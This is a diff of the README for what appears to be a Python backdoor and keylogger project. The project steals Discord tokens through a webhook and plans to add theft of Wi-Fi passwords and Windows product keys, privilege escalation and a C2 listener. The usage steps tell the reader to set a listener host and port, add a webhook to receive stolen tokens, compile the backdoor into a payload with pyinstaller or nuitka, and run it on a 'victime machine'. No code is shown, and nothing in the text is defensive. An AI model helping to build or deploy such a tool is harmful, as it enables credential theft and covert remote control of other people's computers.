@@ -20,13 +20,23 @@ Features:
 >checkprivilege
 >grab discord token(through webhook)
 ``` 
+
+Upcoming features:
+```
+grab wifi passwords
+grab windows product key
+privilege escalation technique
+C2 listener
+```
+
 **How to use?**
 
 ```
 1. edit the host and the port for the listener.py and the backdoor.py
+optional: put your webhook in the discord.py file to recieve discord token
 2. install the requirements.txt using "pip3 install -r requirements.txt"
 3. and then "compile" the backdoor.py and the keylogger.py using pyinstaller or nuitka to create the payload
-4. start the listener.py on your target machine and execute the payload on your target machine
+4. start the listener.py on your target machine and execute the payload on your victime machine
 ```
 
 unobfscated python detection:
